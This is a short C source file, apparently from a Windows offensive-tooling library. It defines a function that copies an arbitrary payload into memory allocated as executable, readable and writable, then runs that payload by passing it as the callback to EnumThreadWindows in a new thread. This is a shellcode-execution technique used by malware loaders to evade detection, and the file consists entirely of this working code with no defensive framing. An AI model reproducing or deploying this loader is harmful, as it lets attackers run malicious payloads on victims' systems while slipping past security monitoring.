#include "Win32Helper.h"

VOID InvokeEnumThreadWindowsThreadCallbackRoutine(LPVOID lpParameter)
{
	EnumThreadWindows(0, (WNDENUMPROC)lpParameter, NULL);
}

BOOL MpfSceViaEnumThreadWindows(_In_ PBYTE Payload, _In_ DWORD PayloadSizeInBytes)
{
	LPVOID BinAddress = NULL;

	BinAddress = VirtualAlloc(NULL, PayloadSizeInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		return FALSE;

	CopyMemoryEx(BinAddress, Payload, PayloadSizeInBytes);

	CreateThreadAndWaitForCompletion((LPTHREAD_START_ROUTINE)InvokeEnumThreadWindowsThreadCallbackRoutine, BinAddress, INFINITE);

	return TRUE;
}